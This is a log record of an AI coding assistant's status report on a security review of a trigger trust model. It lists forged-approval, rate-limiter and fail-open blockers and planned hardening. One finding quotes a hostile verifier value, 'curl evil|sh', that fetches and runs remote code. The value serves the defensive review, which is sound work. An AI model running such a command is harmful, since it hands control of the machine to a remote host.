{"parentUuid":"e6e5adf2-f376-494d-9212-d8ece7882473","isSidechain":false,"message":{"model":"claude-sonnet-5-5","id":"msg_011ChNf3q478UGAKKRpuZ7p3","type":"message","role":"assistant","content":[{"type":"text","text":"The security review of #803 (the BG-3 trigger trust model) came back request changes with five blockers, all confirmed by running. The review is posted on the PR. I claimed the BG-3 trigger firer, since Codex hasn't replied and BG-3 is back in scope. I'm fixing the blockers on #803's own branch and told Codex in the log not to push there meanwhile.\n\n**The five blockers:**\n- **The trust store is not a protected path.** An in-place rewrite of the store forged an approval, and `triggers status` then reported \"may run: yes\".\n- **`approve` hides what the spec does.** It showed only the first 100 characters of the prompt and never the verifier or the file paths. A spec with `verifier:\"curl evil|sh\"` was approved on that display.\n- **The rate limiter has three faults.**\n  - Denied attempts count toward the window, so one probe every 30 minutes kept a once-a-day trigger locked out.\n  - 3,000 attempts took 3.9 seconds.\n  - The limiter map grew to 50,000 entries.\n- **Tampered state fails open.** A garbage quarantine date or an infinite rate admitted every attempt.\n- **The per-workspace cap is never consulted.**\n\nThe fixes also cover the documentation errors, rejecting duplicate ids, and why a spec file is refused.\n\nThe review also lists what the firer itself must add. The main items are:\n- HMAC with a timestamp for replay protection, with the secret outside the repository.\n- A loopback bind and a body size cap.\n- Exactly the hashed spec bytes fired, and trust re-checked at fire time.\n- Run with unattended defaults.\n\nI'll build the firer after the trust fixes are reviewed.\n\n**Status of the rest:**\n- **#805, HK-1 pinning:** the builder is fixing the two bypasses.\n- **#798, HK-3:** its head moved to `6df55baf` while Codex works on the review blockers. I haven't re-reviewed it.\n- **PA-3:** the independent verification is running.\n\nv1.3.0 is not landed. The merge to `main` and the release haven't started."}],"container":null,"stop_reason":"end_turn","stop_sequence":null,"stop_details":null,"usage":{"input_tokens":2,"cache_creation_input_tokens":3169,"cache_read_input_tokens":373307,"output_tokens":699,"output_tokens_details":{"thinking_tokens":0},"server_tool_use":{"web_search_requests":0,"web_fetch_requests":0},"service_tier":"standard","cache_creation":{"ephemeral_1h_input_tokens":0,"ephemeral_5m_input_tokens":3169},"inference_geo":"global","iterations":[{"input_tokens":2,"output_tokens":699,"cache_read_input_tokens":373307,"cache_creation_input_tokens":3169,"cache_creation":{"ephemeral_5m_input_tokens":3169,"ephemeral_1h_input_tokens":0},"type":"message"}],"speed":"standard","fallback_credit":null},"input_transformations":[],"diagnostics":null,"context_management":null},"apiBlockIndex":0,"requestId":"req_011ChNf3psTEB9XCMpaGqF5j","requestRef":"b0b128f1-2c25-4596-b5cd-091a4b7707f6","requestedModel":"claude-sonnet-5-5","promptCacheRequested":"5m","type":"assistant","uuid":"2b22b10b-620f-4152-bbcf-cc7569ef5b93","timestamp":"2026-11-24T23:55:52.288Z","advisorModel":"claude-fable-5-2","effort":"medium","perTurnEffort":"medium","madeBy":"model","session_id":"d25d0d24-8aed-4b03-a951-966dc54f0666","userType":"external","entrypoint":"cli","cwd":"/home/mike/nexus-code","sessionId":"43bcbb67-2cff-4fa8-a05e-f8aa598df73b","version":"2.1.329","gitBranch":"v1/bg3-trust-abuse-model","slug":"synthetic-moseying-seahorse","dataFlowOn":true}
